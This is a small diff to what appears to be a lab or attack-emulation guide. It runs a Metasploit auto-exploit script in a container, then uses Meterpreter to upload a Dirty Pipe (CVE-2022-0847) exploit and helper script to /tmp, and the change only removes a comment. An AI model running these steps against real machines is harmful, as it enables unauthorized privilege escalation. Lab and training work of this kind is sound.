@@ -22,7 +22,6 @@ docker exec -it k1 msfconsole -r MsfAutoExploit.rc
 ```bash
 # All commands shall be executed inside the Meterpreter session established in Execution phase
 # Upload dirtypipe.sh and CVE-2022-0847.c to /tmp directory
-# Both files are located in / directory of Kali container
 upload dirtypipe.sh /tmp
 upload CVE-2022-0847.c /tmp
 
